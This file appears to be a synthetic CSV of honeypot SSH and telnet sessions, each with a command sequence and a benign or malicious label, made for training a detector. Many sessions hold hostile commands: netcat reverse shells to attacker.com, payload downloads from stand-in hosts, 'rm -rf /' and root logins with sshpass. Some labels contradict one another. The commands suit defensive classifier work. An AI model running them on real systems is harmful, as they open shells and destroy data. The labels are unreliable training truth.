session,src_ip,protocol,duration,input_token_count,unique_commands,command_sequence,label
7a7e8a0e-daba-462c-93df-cef6362daac2,40.72.33.246,telnet,87.85,2,3,; pwd; whoami,0
22a74654-1f8b-45e4-b968-993f29a0da05,44.155.133.87,ssh,36.34,1,2,uptime; ,0
e130e72c-4bfa-428c-833c-0cdae1181845,202.96.113.254,ssh,73.96,3,4,date; pwd; ; ls,0
f3b129db-b12c-403c-8d16-7354f842f1c3,185.193.43.52,ssh,277.35,4,3,exit; ls; ls; pwd,0
76a991fa-f8dd-4d00-b4f0-6429a4eba1e6,5.194.165.254,ssh,316.73,17,5,python -m http.server 8080; echo 'pwned' > /tmp/x; python -m http.server 8080; wget http://malicious.site/payload.sh; rm -rf /,1
ad9926a6-d083-4666-90f5-8a92d9b841d4,225.209.248.234,ssh,346.33,14,4,echo 'pwned' > /tmp/x; ./payload.sh; sshpass -p '1234' ssh root@target; ./payload.sh; rm -rf /,1
idle-extra-51,192.168.100.51,telnet,837.7537632,0,0,,0
scan-2,172.16.0.2,telnet,0,0,0,,0
c3df2d60-0aed-48f5-a713-3e417823d757,80.76.151.11,ssh,67.19,2,2,ls; date,0
ec731650-7710-4928-a7c4-79607e1a6b78,143.130.40.85,ssh,173.88,25,5,rm -rf /; nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; chmod +x payload.sh; echo 'pwned' > /tmp/x; chmod +x payload.sh,1
e3862589-63df-4817-b773-c8143a4db861,186.158.51.86,ssh,115.6,5,4,date; exit; whoami; cd /home,0
d1e29cb7-c4ae-443c-b9c9-f313e4cb484b,101.173.13.127,ssh,142.89,2,3,ls; uptime; ,0
d100ff4e-cd63-4d88-a10e-17f4fcfdd25d,111.72.194.52,ssh,718.74,20,4,scp exploit.sh root@target:/tmp/; chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; nc -e /bin/sh attacker.com 4444; python -m http.server 8080,1
f30cb5a5-9083-4ad8-b974-97d19b18cd97,115.128.232.108,ssh,187.14,2,2,logout; date,0
ambiguous-extra-78,10.1.0.78,ssh,143.7135239,8,5,nc -e /bin/sh attacker.com; wget http://bad.com; cd /,1
10546ccb-e9fe-4de8-a7bc-d4d1353ec513,126.42.131.214,ssh,243.05,1,2,uptime; ,0
36a81f84-7a87-4651-985d-9769c9b58c95,214.84.124.139,telnet,203.21,13,4,wget http://malicious.site/payload.sh; rm -rf /; curl -O http://badhost/exploit; sshpass -p '1234' ssh root@target,1
8a6df050-d95c-465b-9213-1770f6670b06,82.63.127.8,ssh,72.17,5,3,pwd; echo test; wget http://suspicious.site/x,0
7bfeb704-3200-4835-b8ca-c131b054ea62,7.177.220.149,ssh,219.36,2,2,pwd; pwd,0
9a6bcb9e-dd9d-49c4-bc0b-a4deb2d7e245,172.204.150.123,telnet,777.66,26,4,wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh,1
4afa62d4-2350-4e07-a57e-fcfffecf629b,126.249.250.49,telnet,844.02,19,6,scp exploit.sh root@target:/tmp/; ./payload.sh; chmod +x payload.sh; sshpass -p '1234' ssh root@target; python -m http.server 8080; rm -rf /,1
16668062-e67b-431e-a47d-1dde0e09951f,84.24.165.221,ssh,16.81,3,3,cd /home; ; ; whoami,0
a45e1d0f-d600-427b-89e6-b2f52d06c1d3,24.84.97.243,telnet,21.6,23,5,python -m http.server 8080; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/,1
87ca2f0a-699a-49b9-a377-47ee36292374,213.65.140.254,ssh,339.08,24,6,sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target; chmod +x payload.sh; chmod +x payload.sh; curl -O http://badhost/exploit; python -m http.server 8080; ./payload.sh,1
d596c765-5e84-4449-be3e-58302f3a4389,98.77.241.19,ssh,313.45,22,5,./payload.sh; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; python -m http.server 8080; echo 'pwned' > /tmp/x; python -m http.server 8080; echo 'pwned' > /tmp/x,1
c1cf9425-b2a2-46b1-aa1f-052cd2d17984,185.209.148.254,ssh,388,22,6,nc -e /bin/sh attacker.com 4444; ./payload.sh; ./payload.sh; chmod +x payload.sh; rm -rf /; python -m http.server 8080; nc -e /bin/sh attacker.com 4444,1
9a4be7b6-88bf-4b69-850b-74d265b69cea,92.30.95.21,ssh,15.63,5,3,ls; whoami; curl -O http://badhost/file,0
802a55f0-d85a-4ac1-8063-fe8546a9bb05,89.161.246.113,ssh,395.62,16,4,nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/,1
ab45ebef-f312-47a0-83c8-36bd0c19d584,102.81.234.112,telnet,102.53,2,2,whoami; date,0
cebcc3b4-4692-410b-8470-712b511cd60c,1.85.12.136,ssh,140.35,2,3,logout; pwd; ,0
10f17bd3-3a9d-4286-a635-58d2ab851e81,46.153.120.202,ssh,310.25,26,6,python -m http.server 8080; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; python -m http.server 8080; sshpass -p '1234' ssh root@target; chmod +x payload.sh; wget http://malicious.site/payload.sh,1
scan-extra-38,172.20.0.38,telnet,0,0,0,,0
28eb8f59-95e5-45c7-b147-40f34fb11010,67.9.93.7,ssh,138.77,1,2,; ls,0
cabe1452-583e-454b-b253-e8bc4eb75ff7,22.116.200.7,ssh,42.83,5,3,ls; whoami; curl -O http://badhost/file,0
759013c2-51e1-4820-b5e7-55cfa4bdb5ee,8.143.25.141,ssh,156.61,19,5,echo 'pwned' > /tmp/x; python -m http.server 8080; sshpass -p '1234' ssh root@target; ./payload.sh; nc -e /bin/sh attacker.com 4444,1
48b0e89b-f154-4721-8e02-bc240e4857ac,130.27.4.219,telnet,25.01,18,5,nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh,1
ambiguous-extra-66,10.1.0.66,telnet,102.379339,8,6,nc -e /bin/sh attacker.com; whoami; date; exit,0
5ef0b2ef-ffd9-4e61-8d50-3f2bfca8d26d,16.180.59.10,ssh,214.99,2,3,whoami; uptime; ,0
9e8b94e2-854f-4350-b70f-787b5698454c,2.37.45.80,ssh,24.85,3,3,cd /home; pwd; ,0
3a0ca9e7-a4cc-4536-ad02-324834f9ccae,143.235.178.27,ssh,149.79,3,3,date; cd /home; ,0
57aae870-4a07-4ab0-9903-e0dff4149d70,192.252.200.190,ssh,100.13,1,3,; ; ls,0
992b7fb7-4108-4050-a923-2d6bc84918f8,38.58.168.2,telnet,210.66,11,4,curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; ./payload.sh; rm -rf /,1
scan-extra-47,172.20.0.47,telnet,0,0,0,,0
87aeb78e-42d0-4145-83ac-751b7d7d42ec,141.74.78.109,ssh,234.23,4,3,ls; ls; ls; pwd,0
02bdf49f-3153-427a-aec5-dfca89c0c753,199.65.91.192,ssh,294.64,1,3,; ; ; ls,0
5573dd66-5b15-47ea-ad4d-b11654e1abe4,10.227.140.199,telnet,345.85,17,5,wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x; ./payload.sh; sshpass -p '1234' ssh root@target,1
5e7c4956-746a-4b14-8dd8-9a57d7d843b1,49.25.209.137,ssh,850.05,14,4,nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh; python -m http.server 8080; curl -O http://badhost/exploit,1
a82ad028-181b-4079-ac3c-e8d98aaa5119,189.253.144.2,telnet,335.7,21,7,scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; ./payload.sh; rm -rf /; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; echo 'pwned' > /tmp/x,1
3d3302a9-5de5-4f64-833e-52a604453776,25.44.72.43,telnet,263.78,1,2,; ls,0
ccdfddc9-1d42-4cbc-b5f4-77db1a3e3a6d,97.85.68.172,ssh,360.59,20,6,chmod +x payload.sh; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; rm -rf /; scp exploit.sh root@target:/tmp/,1
22026b93-9178-4723-8d7d-a051ee557755,121.175.153.121,ssh,197.6,1,2,; uptime,0
ambiguous-49,10.0.0.49,ssh,206.931003,9,4,nc -e /bin/sh attacker.com; date,1
f082ee90-c440-4d24-bf3e-2f88213655d1,136.228.135.238,ssh,481.17,20,6,nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; rm -rf /; ./payload.sh; rm -rf /; wget http://malicious.site/payload.sh; curl -O http://badhost/exploit,1
228dc49d-1a81-4bb7-a0a3-6c2266d842cf,33.192.178.161,ssh,17.7,23,6,echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; curl -O http://badhost/exploit; ./payload.sh; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; python -m http.server 8080,1
64179123-21f9-4975-a415-bf089ca78137,183.232.196.173,ssh,79.21,17,4,./payload.sh; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/,1
bfb7861d-ac80-4371-92ad-e6a05b685332,184.23.239.163,ssh,292.53,26,6,python -m http.server 8080; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; python -m http.server 8080; chmod +x payload.sh; echo 'pwned' > /tmp/x; chmod +x payload.sh,1
b8e1fcb3-7088-4bc6-91cc-a5cea38041ec,165.126.219.85,ssh,432.21,5,3,ls; whoami; curl -O http://badhost/file,1
idle-extra-53,192.168.100.53,telnet,625.6922634,0,0,,0
1c1df936-fff7-4a1e-ac5c-9633805371cb,185.55.150.145,ssh,8.68,5,3,ls; whoami; curl -O http://badhost/file,0
f3ddca1b-2837-49f2-9524-46a2342f5307,62.242.88.46,ssh,247.75,5,4,exit; logout; ls; cd /home,0
50ec7b9c-8718-46d2-a0cc-b6eaace07c2b,227.110.44.206,ssh,729.09,6,3,cd /tmp; chmod +x script.sh; ./script.sh,1
d4683ca9-1a05-40f8-90fc-593984c4f6a0,232.6.91.201,telnet,564.63,13,4,scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit,1
fc760024-b922-43a7-8ca5-21f0bd49870c,11.90.184.128,ssh,138.19,4,4,uptime; pwd; logout; exit,0
4bb84bb6-e170-46f6-87a0-a5ca6bdda3a4,40.99.57.38,ssh,265.99,4,4,pwd; whoami; exit; logout,0
f2471f1b-a6f7-4779-a610-50305902cf82,105.118.65.191,ssh,210.62,16,3,scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/,1
87348d7e-b8be-4cb9-bc4f-d65766374987,197.88.35.194,ssh,105.05,4,4,date; logout; exit; date,0
056e6e00-8795-47c8-92d7-a466fb40c305,61.252.244.108,ssh,75.31,3,2,whoami; cd /home,0
e5068dd2-301d-45d5-ad6b-bf29d5e5d6fc,255.212.52.25,ssh,18.09,22,6,wget http://malicious.site/payload.sh; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; python -m http.server 8080; echo 'pwned' > /tmp/x; echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh,1
5a796629-9877-4348-a327-108a8313ffe7,127.246.107.52,telnet,770.76,17,4,rm -rf /; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; rm -rf /; rm -rf /; wget http://malicious.site/payload.sh,1
b22a818d-9f3c-4eea-936c-324b758521a8,54.221.188.34,telnet,231.32,2,2,; ls; ls,0
863b628f-a553-4101-a6f3-bb8cc9ff5e98,79.211.181.35,ssh,107.42,2,2,pwd; pwd,0
7d3a3e34-a14a-4552-9438-817b2fd958ba,180.164.47.11,ssh,607.46,24,6,echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; rm -rf /; echo 'pwned' > /tmp/x; echo 'pwned' > /tmp/x; ./payload.sh; sshpass -p '1234' ssh root@target,1
4ad91d37-42f9-42c3-ad92-3ff3bdc88727,133.141.12.132,ssh,778.11,18,5,nc -e /bin/sh attacker.com 4444; python -m http.server 8080; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x,1
73a9fedc-b625-431a-83b6-dd27f3578672,63.126.176.159,ssh,820.72,25,7,sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; rm -rf /; python -m http.server 8080; chmod +x payload.sh; wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444,1
a3884a89-9ae4-493b-8439-df4ebcc2a824,222.170.27.128,telnet,21.98,3,2,cd /home; ls,0
90425cac-cdbc-4d91-ae09-d41741600cb1,248.81.214.94,ssh,188.86,2,3,uptime; whoami; ,0
ambiguous-extra-48,10.1.0.48,telnet,80.02643445,2,7,whoami; exit; date; wget http://bad.com,1
540096b7-88f0-4553-b6c7-9981ba4f6fda,219.150.202.23,ssh,98.72,2,3,exit; logout; ,0
scan-extra-21,172.20.0.21,telnet,0,0,0,,0
5e88caf7-2fd5-4236-a562-e10ec61505e1,104.203.157.13,telnet,324.64,12,3,rm -rf /; chmod +x payload.sh; chmod +x payload.sh; curl -O http://badhost/exploit,1
23d04c03-ce5e-4f85-81bf-4783cca20d2e,218.194.250.243,ssh,898.96,30,5,sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x; chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; python -m http.server 8080; python -m http.server 8080; nc -e /bin/sh attacker.com 4444,1
dc72e921-20f0-46f4-86e6-b37c72558424,81.248.103.130,ssh,107.07,14,5,scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; ./payload.sh; wget http://malicious.site/payload.sh,1
31f21a15-6330-4770-8d49-e3e5d83f147f,25.44.29.149,ssh,267.88,11,4,scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; chmod +x payload.sh; ./payload.sh; wget http://malicious.site/payload.sh,1
2ad8bee7-5ef3-4665-a01c-466c8c5e692e,155.88.9.143,ssh,137.48,13,4,rm -rf /; echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; chmod +x payload.sh,1
843b6021-cb6d-4e91-8469-2544fed31d23,148.244.126.130,ssh,137.61,15,5,python -m http.server 8080; echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; rm -rf /; ./payload.sh,1
4ed9378e-0ea0-44d5-8206-397717de297d,72.128.53.201,telnet,263.12,5,3,date; logout; nc attacker.com 4444,0
972394e5-66a8-4ff0-8b17-5466f3744d0e,193.188.211.49,ssh,32.27,16,4,wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444; ./payload.sh; echo 'pwned' > /tmp/x; echo 'pwned' > /tmp/x,1
b0974231-93b1-421c-b322-438f6c7a61ee,138.136.92.130,ssh,728.14,16,4,curl -O http://badhost/exploit; ./payload.sh; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; ./payload.sh; scp exploit.sh root@target:/tmp/,1
f249ff97-dfdb-4f74-b309-db670236cc5a,74.148.136.6,ssh,70.17,3,3,; whoami; whoami; pwd,0
ebf61340-7136-475e-ae82-edea0bd08a15,232.197.129.121,ssh,11.54,2,3,pwd; ; ; date,0
481e7983-a612-4f5e-b0e8-5cd1ef100ca7,25.194.72.162,ssh,27.11,1,2,date; ; ,0
f0adc0a5-79ac-45bd-a407-a7be0032a55a,47.104.31.218,telnet,586.07,9,4,./payload.sh; ./payload.sh; rm -rf /; python -m http.server 8080,1
c6cb5c32-212a-4590-a984-d403ceaa53d4,154.213.127.30,ssh,202.09,25,5,echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; curl -O http://badhost/exploit; python -m http.server 8080; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/,1
3867ae25-a6f4-4040-a488-9dff8a9461e1,108.18.251.190,ssh,102.18,2,3,; cd /home; ,0
06fdf206-ba03-4cf9-9b91-6585bfa968c0,52.88.145.24,ssh,186.98,5,3,pwd; echo test; wget http://suspicious.site/x,0
3aaeb542-f723-405f-ac53-12e0b7c8d572,234.253.59.166,ssh,221.79,13,4,./payload.sh; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x,1
a61edf09-4570-4c29-8e43-d8c28f2f140b,41.210.171.60,ssh,234.55,14,4,python -m http.server 8080; scp exploit.sh root@target:/tmp/; chmod +x payload.sh; python -m http.server 8080,1
c2232dee-afe7-460f-81af-399e81c18be0,233.247.87.198,ssh,105.15,3,4,ls; date; ; logout,0
scan-18,172.16.0.18,telnet,0,0,0,,0
cdfbe9f3-1ef2-4e5a-a1f4-715c42e49fba,182.20.243.54,ssh,226.12,5,3,; pwd; cd /home; cd /home,0
12487844-70ff-4f31-a8cb-c90e94d1cfa5,109.158.237.193,ssh,285.77,3,3,; pwd; cd /home,0
d154b158-2288-469b-aca6-70875ed69bfa,239.237.10.5,ssh,573.33,15,4,curl -O http://badhost/exploit; curl -O http://badhost/exploit; python -m http.server 8080; sshpass -p '1234' ssh root@target,1
1e4a1a1b-fdf2-4ce5-a1ad-31af9bcf5f50,204.127.16.186,telnet,186.83,4,3,pwd; exit; pwd; pwd,0
idle-extra-82,192.168.100.82,ssh,748.3027825,0,0,,0
620c338f-050c-4f1d-bc31-15494664ae1c,130.33.6.246,ssh,62,2,2,; exit; exit,0
scan-extra-41,172.20.0.41,telnet,0,0,0,,0
7f066d72-25e4-45d8-a14e-5fa2e331cd24,171.139.254.42,ssh,712.48,14,4,echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target; ./payload.sh; python -m http.server 8080,1
62e0bb52-48cf-481b-a83e-77fbcf28db0a,56.237.130.125,ssh,762.37,13,4,echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; curl -O http://badhost/exploit; echo 'pwned' > /tmp/x,1
448e3916-0bff-4fd8-bb69-7929e687a249,158.63.205.87,ssh,157.3,1,2,; date,0
ec2666ed-5b84-4d34-98fe-406b4551888c,161.17.10.176,ssh,631.62,18,4,chmod +x payload.sh; curl -O http://badhost/exploit; curl -O http://badhost/exploit; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x,1
f4c8ee05-c8ba-4893-93ac-fed03485ea6e,122.171.177.60,telnet,260.01,2,2,whoami; logout,0
c12b110a-2bb2-4e40-bae5-06040619fd5e,244.169.250.48,telnet,481.13,19,6,wget http://malicious.site/payload.sh; chmod +x payload.sh; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444,1
cff6236c-fc7f-4f20-90d7-5b1efd246173,246.64.103.66,ssh,206.59,3,3,; ls; uptime; ls,0
b7d4c609-36ca-48fc-a206-33aa660ccdbc,29.228.250.55,ssh,215.82,0,2,; ,0
9c2cc55c-2306-4abf-8d3a-b561823cdd42,89.129.207.186,ssh,190.39,2,3,logout; ls; ,0
ambiguous-8,10.0.0.8,ssh,227.7304277,3,2,whoami; chmod +x payload.sh; ls; pwd,0
4374e375-5ea1-4166-92a4-bdca8871e05f,165.180.116.64,ssh,410.53,19,5,scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; python -m http.server 8080; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444,1
04f1ba71-72eb-4f6d-a4fb-eff9b17f7fed,23.241.83.174,ssh,640.54,15,4,wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh,1
343b6e4c-5495-496b-8ce7-e6f69e2bfacc,216.241.226.235,ssh,104.6,2,4,; whoami; ; pwd,0
b83b0d8f-0507-4e2a-9ce5-c6cb63139a08,239.123.238.115,telnet,275.03,5,4,exit; whoami; exit; cd /home,0
50250d3e-9869-4066-a3ec-20ecffbb3207,9.74.74.28,ssh,209.12,14,5,scp exploit.sh root@target:/tmp/; chmod +x payload.sh; rm -rf /; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/,1
7fe58e2f-b2af-45d6-aa45-c841f46e85d8,4.128.141.144,telnet,244.65,2,2,logout; pwd,0
44f5a443-3685-4a57-809d-79e6d2cbf340,132.213.253.39,ssh,293.21,3,3,logout; date; exit,0
28b4388b-bd41-4167-b06b-4e81982153af,55.196.180.217,ssh,738.28,14,5,rm -rf /; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; curl -O http://badhost/exploit; ./payload.sh,1
1a3b8cfe-715d-4499-b382-f53d1e401672,197.177.28.55,telnet,282.11,1,3,; exit; ,0
ac044f22-94c8-4978-8fcd-c5cbffd44149,130.121.104.168,telnet,502.44,21,5,chmod +x payload.sh; python -m http.server 8080; python -m http.server 8080; chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh,1
7dde5e51-7bc6-4445-9c5a-59d90d1ef02e,188.113.17.6,ssh,202.56,9,3,echo 'pwned' > /tmp/x; ./payload.sh; curl -O http://badhost/exploit; ./payload.sh,1
idle-19,192.168.1.19,ssh,734.5041017,0,0,,0
106cff70-0da8-494d-9693-bad0bda36622,187.93.36.213,ssh,781.99,17,5,./payload.sh; rm -rf /; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444,1
75e12786-5963-4366-92a1-eeb23f7e80d6,24.44.172.120,ssh,78.33,1,3,; ; date,0
36457986-53e1-47b5-a8e3-a2e798a9fc7b,234.153.85.197,telnet,199.25,2,2,uptime; date,0
52de57a9-fe29-458e-bd01-b329d4a4bb75,188.179.1.173,ssh,74.98,6,3,cd /tmp; chmod +x script.sh; ./script.sh,1
2eeca8b9-541a-4a0b-bf01-466b3e98937f,118.112.62.1,telnet,56.65,4,4,uptime; date; ls; exit,0
eef174cc-2927-4e01-8425-b4230aa466a8,100.42.74.148,ssh,54.26,3,3,ls; pwd; logout,0
f5d4c0c1-6dc4-49d1-88d6-bca0f1fedc03,195.121.53.48,telnet,563.95,24,4,scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/,1
e557647d-7bb4-4018-a8fa-df85d6a03ba4,212.151.61.17,ssh,155.69,3,4,pwd; ; logout; uptime,0
c8c4a065-d22a-4b5b-946d-2fd6473cfc36,164.192.58.193,telnet,272.67,3,4,whoami; date; ; pwd,0
b117ef3a-07ee-4cbf-a57a-6ad59ad3c33c,141.119.42.40,ssh,117.52,12,4,wget http://malicious.site/payload.sh; curl -O http://badhost/exploit; rm -rf /; python -m http.server 8080,1
de636b60-0adb-4704-802b-3253f9dc300b,45.187.24.149,ssh,243.47,3,4,uptime; date; whoami; ,0
9d1a3b78-4f15-4237-ab6b-732e54c18995,27.6.56.157,ssh,57.09,3,2,whoami; exit; exit,0
8d114bdb-9793-42fc-87c5-8b5b7cc8f015,163.17.80.19,telnet,128.09,20,6,echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; ./payload.sh; sshpass -p '1234' ssh root@target; chmod +x payload.sh; python -m http.server 8080,1
aef9c7a9-fe37-4a0b-a1d5-cb58dfe981b9,190.47.144.13,ssh,266.49,1,2,; pwd,0
f4f175c3-7cf8-4307-b6bc-1e352ffa527e,241.78.175.61,ssh,43.66,0,2,; ; ,0
36955f33-9d84-4db6-8d09-92c3843c0335,119.222.194.83,ssh,113.72,0,2,; ; ,0
ec5a6d2d-b31d-4ba4-bc80-a8138ad92005,65.50.247.65,telnet,406.19,26,5,sshpass -p '1234' ssh root@target; python -m http.server 8080; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; nc -e /bin/sh attacker.com 4444,1
2f2c2da6-5ce9-48ea-adcd-2c12bd35e647,238.129.243.211,ssh,162.56,3,4,date; exit; logout; ,0
9b223d23-eef7-4699-b9a0-1bb8eeae274a,23.133.215.196,ssh,249.31,3,3,whoami; uptime; logout,0
666b47b9-ee52-463b-b943-b7ea85d98b47,91.66.177.237,ssh,82.42,19,4,sshpass -p '1234' ssh root@target; ./payload.sh; echo 'pwned' > /tmp/x; chmod +x payload.sh; chmod +x payload.sh; chmod +x payload.sh,1
682e5ce3-7a31-4951-9e4e-fd470dab61cf,208.42.162.212,telnet,813.95,14,4,wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target; python -m http.server 8080; chmod +x payload.sh,1
78576915-fcfe-4f06-9c14-d7e5d9626520,230.60.62.16,telnet,26.93,5,4,exit; cd /home; exit; date,0
a0772189-5e2d-46c9-8a39-116e32f8a155,178.21.105.48,ssh,25.87,21,4,./payload.sh; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; python -m http.server 8080; sshpass -p '1234' ssh root@target,1
baf87d0a-5282-4ba1-8399-ec06cba07aaf,71.55.50.70,ssh,236.65,5,3,ls; whoami; curl -O http://badhost/file,0
b845e485-caf2-4ee4-89ef-cee2f03ea5bd,28.122.160.208,ssh,813.81,20,4,python -m http.server 8080; nc -e /bin/sh attacker.com 4444; python -m http.server 8080; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh,1
b5f69882-0a97-4f55-9c41-0f309a938a56,77.246.17.4,ssh,180.6,1,2,; pwd,0
f38167fb-4330-4116-a56d-2546b015d846,141.208.7.198,ssh,402.31,16,5,scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; ./payload.sh; sshpass -p '1234' ssh root@target,1
fd83e08f-6a75-43a3-b3e7-91d178500f86,113.166.131.144,ssh,78.96,2,2,ls; pwd,0
idle-extra-74,192.168.100.74,ssh,606.9126954,0,0,,0
ea4d697e-6c6e-4df5-8c48-0bda33ebe0d1,118.22.158.141,ssh,218.15,4,3,cd /home; uptime; whoami,0
dc0c2c1f-9fd1-49dc-9c9d-c44d1eb84950,237.107.255.49,ssh,644.9,23,6,curl -O http://badhost/exploit; chmod +x payload.sh; wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target; ./payload.sh; echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target,1
6a8486b4-fb01-4bbd-9c10-08d06cf00495,51.101.171.197,ssh,160.32,3,2,date; cd /home,0
ec0ad437-9792-49e2-b8fd-472bfea8765d,116.30.138.193,ssh,36.58,2,2,pwd; whoami,0
6bc546f8-6333-4743-8d4d-787ba75a327f,79.233.127.54,ssh,613.31,16,4,rm -rf /; echo 'pwned' > /tmp/x; echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/,1
e4d4c4b6-91c5-4d7a-9fd6-619ca8b95bcc,35.166.9.154,telnet,133.82,11,4,echo 'pwned' > /tmp/x; ./payload.sh; python -m http.server 8080; wget http://malicious.site/payload.sh,1
860c012d-5456-4728-bc39-e4fb4a946cc8,74.129.30.160,ssh,782.65,5,3,date; logout; nc attacker.com 4444,1
